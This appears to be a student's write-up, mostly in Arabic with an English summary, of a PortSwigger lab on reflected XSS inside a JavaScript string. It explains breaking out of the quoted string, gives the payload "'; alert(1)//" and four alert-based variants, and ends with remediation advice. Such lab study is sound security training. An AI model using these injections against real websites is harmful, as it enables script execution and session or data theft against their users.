## [Reflected XSS into a **JavaScript String** with **Angle Brackets HTML-Encoded**](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)

## 1. فكرة اللاب

الثغرة موجودة داخل **JavaScript context** وبالتحديد داخل **String**:

```javascript
var searchTerms = 'USER_INPUT';
```

المدخل ينعكس داخل سلسلة نصية **محصورة بين علامات اقتباس مفردة `' '`**.  
كما أن `<` و `>` يتم ترميزها، لذلك لا يمكن حقن `<script>` أو أي وسم HTML مباشرة.

الحل الوحيد هو:

## **كسر السلسلة النصية (break out of JS string)**

ثم حقن JavaScript صالح  
ثم التعليق على بقية السطر حتى لا يحدث خطأ.

---

## 2. تحليل نقطة الحقن

الكود الذي يعرضه اللاب:

```html
<script>
    var searchTerms = 'USER_INPUT';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

بما أن الإدخال داخل:

```
'USER_INPUT'
```

أنت تحتاج إلى:

1. إغلاق الاقتباس `'`
    
2. كتابة JavaScript
    
3. التعليق على الباقي `//`
    

---

## 3. الـ Payload الصحيح

الـ payload الذي استخدمته:

```
'; alert(1)//
```

يحوّل السطر إلى:

```javascript
var searchTerms = ''; alert(1)//';
```

وهذا يؤدي إلى:

- إغلاق السلسلة الأولى
    
- تنفيذ alert
    
- التعليق على بقية النص حتى لا يحدث خطأ في JavaScript
    

![[photo/Screenshot From 2025-11-18 20-02-01.png]]

---
## 5. أمثلة Payloads إضافية تصلح لهذا السياق

### 1. تنفيذ alert:

```
';alert(1);//
```

### 2. استخدام eval:

```
';eval('alert(1)');//
```

### 3. استخدام onerror hack:

```
';throw onerror=alert;//
```

### 4. حقن متغير جديد:

```
';var x=alert(1);//
```


---

## 6. ملاحظات مهمة على هذا النوع من XSS

- **بما أن `< >` مُرمّزة، لا يوجد أي فائدة من وسوم HTML.**
    
- الحل دائماً يكون عبر **string breaking**.
    
- `//` أو `/* */` ضروريان حتى لا يتسبب الجزء الأصلي من السطر في خطأ syntax.
    
- يمكن أيضاً استخدام `';`
    

---

# **Reflected XSS – JavaScript String Injection (Angle Brackets Encoded)**

### **Summary**

The search feature reflects user input inside a JavaScript string. Angle brackets are HTML-encoded, preventing HTML-tag injection, but quotes are not encoded. This allows the attacker to break out of the JavaScript string and inject arbitrary JavaScript.

---

### **Vulnerable Code**

```javascript
var searchTerms = 'USER_INPUT';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```

---

### **Root Cause**

- User-controlled data is inserted directly inside a JS string.
    
- `'` (single quote) is not encoded.
    
- No sanitization or escaping is performed.
    

---

### **Proof of Concept (PoC)**

Search parameter used:

```
'; alert(1)//
```

Results in the final script:

```javascript
var searchTerms = ''; alert(1)//';
```

This breaks the JS string, executes `alert`, then comments out the rest to avoid syntax errors.

---

### **Impact**

- Arbitrary JavaScript execution
    
- Full session compromise
    
- Data theft
    
- Forced redirections
    
- Keylogging
    

---

### **Recommendation**

- Encode quotes inside JavaScript strings.
    
- Use safe functions such as `JSON.stringify()` when embedding untrusted data.
    
- Avoid concatenating untrusted input directly into JS.
    
- Apply Content Security Policy (CSP).
    

---
